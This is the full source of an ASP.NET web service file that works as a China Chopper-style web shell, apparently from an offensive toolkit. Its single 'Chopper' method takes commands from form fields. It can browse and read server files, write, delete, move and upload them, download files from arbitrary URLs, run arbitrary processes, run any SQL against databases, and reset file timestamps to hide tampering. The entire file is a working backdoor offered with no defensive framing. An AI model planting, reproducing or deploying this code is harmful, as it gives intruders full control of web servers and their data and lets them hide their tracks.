<%@ WebService Language="C#" Class="Service" %>
using System;
using System.Web;
using System.IO;
using System.Net;
using System.Text;
using System.Data;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Diagnostics;
using System.Web.SessionState;
using System.Web.Services;
using System.Xml;
using System.Web.Services.Protocols;

[WebService(Namespace = "http://www.wooyun.org/whitehats/RedFree")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]

public class Service : System.Web.Services.WebService
{
    public Service()
    {

        //如果使用设计的组件，请取消注释以下行
        //InitializeComponent(); 
    }

    [WebMethod]
    public string Chopper() {
        String Z = HttpContext.Current.Request.Form["z"];//设置密码
        if (Z != "")
        {
            String Z1 = HttpContext.Current.Request.Form["Z1"];
            String Z2 = HttpContext.Current.Request.Form["Z2"];
            String R = "";
            try
            {
                switch (Z)
                {
                    case "A":
                        {
                            String[] c = Directory.GetLogicalDrives();
                            R = String.Format("{0}\t", HttpContext.Current.Server.MapPath("/"));
                            for (int i = 0; i < c.Length; i++)
                                R += c[i][0] + ":";
                            break;
                        }
                    case "B":
                        {
                            DirectoryInfo m = new DirectoryInfo(Z1);
                            foreach (DirectoryInfo D in m.GetDirectories())
                            {
                                R += String.Format("{0}/\t{1}\t0\t-\n", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss"));
                            }
                            foreach (FileInfo D in m.GetFiles())
                            {
                                R += String.Format("{0}\t{1}\t{2}\t-\n", D.Name, File.GetLastWriteTime(Z1 + D.Name).ToString("yyyy-MM-dd hh:mm:ss"), D.Length);
                            }
                            break;
                        }
                    case "C":
                        {
                            StreamReader m = new StreamReader(Z1, Encoding.Default);
                            R = m.ReadToEnd();
                            m.Close();
                            break;
                        }
                    case "D":
                        {
                            StreamWriter m = new StreamWriter(Z1, false, Encoding.Default);
                            m.Write(Z2);
                            R = "1";
                            m.Close();
                            break;
                        }
                    case "E":
                        {
                            if (Directory.Exists(Z1))
                            {
                                Directory.Delete(Z1, true);
                            }
                            else
                            {
                                File.Delete(Z1);
                            }
                            R = "1";
                            break;
                        }
                    case "F":
                        {
                            HttpContext.Current.Response.Clear();
                            HttpContext.Current.Response.Write("<?xml version=\"1.0\" encoding=\"utf-8\"?>");
                            HttpContext.Current.Response.Write("<data>");
                            HttpContext.Current.Response.Write("<![CDATA[");
                            HttpContext.Current.Response.Write("\x2D\x3E\x7C");
                            HttpContext.Current.Response.WriteFile(Z1);
                            HttpContext.Current.Response.Write("\x7C\x3C\x2D");
                            HttpContext.Current.Response.Write("]]>");
                            HttpContext.Current.Response.Write("</data>");
                            HttpContext.Current.Response.End();
                            goto End;
                        }
                    case "G":
                        {
                            byte[] B = new byte[Z2.Length / 2];
                            for (int i = 0; i < Z2.Length; i += 2)
                            {
                                B[i / 2] = (byte)Convert.ToInt32(Z2.Substring(i, 2), 16);
                            }
                            FileStream fs = new FileStream(Z1, FileMode.Create);
                            fs.Write(B, 0, B.Length);
                            fs.Close();
                            R = "1";
                            break;
                        }
                    case "H":
                        {
                            CP(Z1, Z2);
                            R = "1";
                            break;
                        }
                    case "I":
                        {
                            if (Directory.Exists(Z1))
                            {
                                Directory.Move(Z1, Z2);
                            }
                            else
                            {
                                File.Move(Z1, Z2);
                            }
                            break;
                        }
                    case "J":
                        {
                            Directory.CreateDirectory(Z1);
                            R = "1";
                            break;
                        }
                    case "K":
                        {
                            DateTime TM = Convert.ToDateTime(Z2);
                            if (Directory.Exists(Z1))
                            {
                                Directory.SetCreationTime(Z1, TM);
                                Directory.SetLastWriteTime(Z1, TM);
                                Directory.SetLastAccessTime(Z1, TM);
                            }
                            else
                            {
                                File.SetCreationTime(Z1, TM);
                                File.SetLastWriteTime(Z1, TM);
                                File.SetLastAccessTime(Z1, TM);
                            }
                            R = "1";
                            break;
                        }
                    case "L":
                        {
                            HttpWebRequest RQ = (HttpWebRequest)WebRequest.Create(new Uri(Z1));
                            RQ.Method = "GET";
                            RQ.ContentType = "application/x-www-form-urlencoded";
                            HttpWebResponse WB = (HttpWebResponse)RQ.GetResponse();
                            Stream WF = WB.GetResponseStream();
                            FileStream FS = new FileStream(Z2, FileMode.Create, FileAccess.Write);
                            int i;
                            byte[] buffer = new byte[1024];
                            while (true)
                            {
                                i = WF.Read(buffer, 0, buffer.Length);
                                if (i < 1)
                                {
                                    break;
                                }
                                FS.Write(buffer, 0, i);
                            }
                            WF.Close();
                            WB.Close();
                            FS.Close();
                            R = "1";
                            break;
                        }
                    case "M":
                        {
                            ProcessStartInfo c = new ProcessStartInfo(Z1.Substring(2));
                            Process e = new Process();
                            StreamReader OT, ER;
                            c.UseShellExecute = false;
                            c.RedirectStandardOutput = true;
                            c.RedirectStandardError = true;
                            e.StartInfo = c;
                            c.Arguments = String.Format("{0} {1}", Z1.Substring(0, 2), Z2);
                            e.Start();
                            OT = e.StandardOutput;
                            ER = e.StandardError;
                            e.Close();
                            R = OT.ReadToEnd() + ER.ReadToEnd();
                            break;
                        }
                    case "N":
                        {
                            String strDat = Z1.ToUpper();
                            SqlConnection Conn = new SqlConnection(Z1);
                            Conn.Open();
                            R = Conn.Database + "\t";
                            Conn.Close();
                            break;
                        }
                    case "O":
                        {
                            String[] x = Z1.Replace("\r", "").Split('\n');
                            String strConn = x[0], strDb = x[1];
                            SqlConnection Conn = new SqlConnection(strConn);
                            Conn.Open();
                            DataTable dt = Conn.GetSchema("Columns");
                            Conn.Close();
                            for (int i = 0; i < dt.Rows.Count; i++)
                            {
                                R += String.Format("{0}\t", dt.Rows[i][2].ToString());
                            }
                            break;
                        }
                    case "P":
                        {
                            String[] x = Z1.Replace("\r", "").Split('\n'), p = new String[4];
                            String strConn = x[0], strDb = x[1], strTable = x[2];
                            p[0] = strDb;
                            p[2] = strTable;
                            SqlConnection Conn = new SqlConnection(strConn);
                            Conn.Open();
                            DataTable dt = Conn.GetSchema("Columns", p);
                            Conn.Close();
                            for (int i = 0; i < dt.Rows.Count; i++)
                            {
                                R += String.Format("{0} ({1})\t", dt.Rows[i][3].ToString(), dt.Rows[i][7].ToString());
                            }
                            break;
                        }
                    case "Q":
                        {
                            String[] x = Z1.Replace("\r", "").Split('\n');
                            String strDat, strConn = x[0], strDb = x[1];
                            int i, c;
                            strDat = Z2.ToUpper();
                            SqlConnection Conn = new SqlConnection(strConn);
                            Conn.Open();
                            if (strDat.IndexOf("SELECT ") == 0 || strDat.IndexOf("EXEC ") == 0 || strDat.IndexOf("DECLARE ") == 0)
                            {
                                SqlDataAdapter OD = new SqlDataAdapter(Z2, Conn);
                                DataSet ds = new DataSet();
                                OD.Fill(ds);
                                if (ds.Tables.Count > 0)
                                {
                                    DataRowCollection rows = ds.Tables[0].Rows;
                                    for (c = 0; c < ds.Tables[0].Columns.Count; c++)
                                    {
                                        R += String.Format("{0}\t|\t", ds.Tables[0].Columns[c].ColumnName.ToString());
                                    }
                                    R += "\r\n";
                                    for (i = 0; i < rows.Count; i++)
                                    {
                                        for (c = 0; c < ds.Tables[0].Columns.Count; c++)
                                        {
                                            R += String.Format("{0}\t|\t", rows[i][c].ToString());
                                        }
                                        R += "\r\n";
                                    }
                                }
                                ds.Clear();
                                ds.Dispose();
                            }
                            else
                            {
                                SqlCommand cm = Conn.CreateCommand();
                                cm.CommandText = Z2;
                                cm.ExecuteNonQuery();
                                R = "Result\t|\t\r\nExecute Successfully!\t|\t\r\n";
                            }
                            Conn.Close();
                            break;
                        }
                    default: goto End;
                }
            }
            catch (Exception E)
            {
                R = "ERROR:// " + E.Message;
            }
            HttpContext.Current.Response.Write("<?xml version=\"1.0\" encoding=\"utf-8\"?>");
            HttpContext.Current.Response.Write("<data>");
            HttpContext.Current.Response.Write("<![CDATA[");
            HttpContext.Current.Response.Write("\x2D\x3E\x7C" + R + "\x7C\x3C\x2D");
            HttpContext.Current.Response.Write("]]>");
            HttpContext.Current.Response.Write("</data>");
            HttpContext.Current.Response.End();
        End: ;
        }
        return "";
    }
    public void CP(String S, String D)
    {
        if (Directory.Exists(S))
        {
            DirectoryInfo m = new DirectoryInfo(S);
            Directory.CreateDirectory(D);
            foreach (FileInfo F in m.GetFiles())
            {
                File.Copy(S + "\\" + F.Name, D + "\\" + F.Name);
            }
            foreach (DirectoryInfo F in m.GetDirectories())
            {
                CP(S + "\\" + F.Name, D + "\\" + F.Name);
            }
        }
        else
        {
            File.Copy(S, D);
        }
    }
}
